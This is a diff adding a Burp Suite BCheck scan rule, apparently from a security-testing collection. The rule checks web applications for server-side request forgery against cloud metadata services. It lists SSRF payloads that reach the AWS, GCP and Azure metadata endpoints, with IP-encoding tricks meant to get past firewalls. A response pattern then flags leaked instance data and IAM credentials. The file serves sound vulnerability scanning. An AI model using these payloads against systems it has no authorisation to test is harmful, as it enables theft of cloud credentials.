@@ -1,0 +1,27 @@
+metadata:
+    language: v2-beta
+    name: "SSRF - Cloud Metadata Access with WAF Bypass"
+    description: "Tests for SSRF targeting cloud metadata endpoints with IP obfuscation"
+    author: "BCheck Arsenal"
+    tags: "ssrf", "cloud", "metadata", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "http://169.254.169.254/latest/meta-data/"
+            - "http://2852039166/latest/meta-data/"
+            - "http://0xA9FEA9FE/latest/meta-data/"
+            - "http://0251.0376.0251.0376/latest/meta-data/"
+            - "http://[::ffff:169.254.169.254]/latest/meta-data/"
+            - "http://metadata.google.internal/computeMetadata/v1/"
+            - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+            - "http://169.254.169.254.nip.io/latest/meta-data/"
+
+    if {check.response} matches "(ami-id|instance-id|iam/|computeMetadata|azEnvironment|local-ipv4|security-credentials)" then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "SSRF to cloud metadata endpoint detected. Application can access instance metadata and IAM credentials."
+            remediation: "Implement allowlist-based URL validation. Use IMDSv2 on AWS. Block link-local addresses."
+    end if
